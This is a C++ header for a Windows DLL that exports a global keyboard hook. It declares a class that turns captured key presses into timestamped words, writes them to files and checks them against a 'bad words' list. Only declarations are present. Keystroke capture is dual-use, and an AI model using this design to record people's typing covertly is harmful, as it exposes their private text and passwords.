#define KBHOOKPROC_API __declspec(dllexport)

#ifndef KBHOOKPROC_H_
#define KBHOOKPROC_H_

#include<Windows.h>
#include<iostream>
#include <fstream>
#include <chrono>
#include <ctime>
#include <cctype> // toupper char

extern "C" KBHOOKPROC_API void SetStatsPath(std::string newPath);
extern "C" KBHOOKPROC_API void SetModPath(std::string newPath);
extern "C" KBHOOKPROC_API void SetBadWordsPath(std::string newPath);

extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
	_In_ int    code,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
);

class WordOfVkeys {
private:
	static WordOfVkeys* _instance;
	std::string _whereToWriteKeys;
	std::string _whereToWriteWords;
	std::string _whereToReadBadWords;

	WordOfVkeys():
		_whereToWriteKeys(""),
		_whereToWriteWords(""),
		_whereToReadBadWords(""){

	}
public:
	static WordOfVkeys* GetInstance() {
		if (!_instance)
			_instance = new WordOfVkeys();
		
		return _instance;
	}
	void SetWhereToWriteKeys(std::string path){
		_whereToWriteKeys = path;
	}
	void SetWhereToWriteWords(std::string path) {
		_whereToWriteWords = path;
	}
	void SetWhereToReadBadWords(std::string path) {
		_whereToReadBadWords = path;
	}

	bool IsUnPrintableKey(WPARAM vkey);
	bool IsKeyDownState(LPARAM vkeyAttr);
	void AddVkeyToWord(WPARAM vkey);

private:
	HKL GetCurrentLayout();
	std::string GetCurrTimeBuff();
	char GetCharSymbFromVkey(WPARAM vkey, HKL kbLayout);
	void WriteTofile(std::string fileName, std::string info);
};

#endif